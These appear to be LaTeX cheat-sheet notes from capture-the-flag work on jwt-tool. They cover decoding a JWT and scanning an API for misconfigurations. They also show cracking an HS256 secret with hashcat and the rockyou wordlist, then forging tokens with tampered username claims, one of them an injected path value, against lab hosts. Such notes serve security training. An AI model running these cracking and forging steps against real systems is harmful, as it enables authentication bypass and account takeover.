\section{jwt-tool}
\label{tool:jwt-tool}
config in  \verb+ ~/.jwt_tool/jwtconf.ini+

\subsection*{Recon}
Read the token value to get a feel for the claims/values expected in the
application:
\begin{verbatim}
$ jwt-tool  eyJhi...SNIP...iAXwbmRH0g1zyIoMeapN96Emw

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] username = "christopher.jones"
[+] iat = 1670650330    ==> TIMESTAMP = 2022-12-10 06:32:10 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
\end{verbatim}


\subsection{WebSite scanning}
Run a Playbook Scan using the provided token directly against the application
to hunt for common misconfigurations with modification applyed to the payload:
\begin{verbatim}
$ jwt-tool \
    -I -pc username -pv james \
    -rh 'Content-Type: application/json' \
    -rh "Authorization: $TOKEN_INIT" \
    -t http://api.mentorquotes.htb/users/ -M pb
\end{verbatim}

In order to perfom {\bf Spoof JWKS} launch a docker reflecting http request
\begin{verbatim}
docker pull kennethreitz/httpbin
docker run -p 80:80 kennethreitz/httpbin
\end{verbatim}

and edit if necessary the \verb+jwtconf.ini+ to point to it


\subsection*{cracking and tampering}

with a HS256 signature
\begin{verbatim}
$ hashcat -a 0 -m 16500 jwt.token /usr/share/wordlists/passwords/rockyou.txt

$ jwt-tool -T -p 123beany123 -S hs256  eyJhbGciOiJIU.. .SNIP. ..byIoMeapN96Emw
$ jwt-tool -I -pc username -pv toto -p 123beany123 -S hs256  eyJhbGciOiJIU.. .SNIP. ..byIoMeapN96Emw
\end{verbatim}

\subsection*{interacting with website}

\begin{verbatim}
jwt-tool -I -pc username -pv /tmp/files -p 123beany123 -S hs256 \
    -t http://hat-valley.htb/api/all-leave \
    -rc "token=eyJhbGciO.. .SNIP. ..MeapN96Emw"
\end{verbatim}

the data can be intercepted by burp
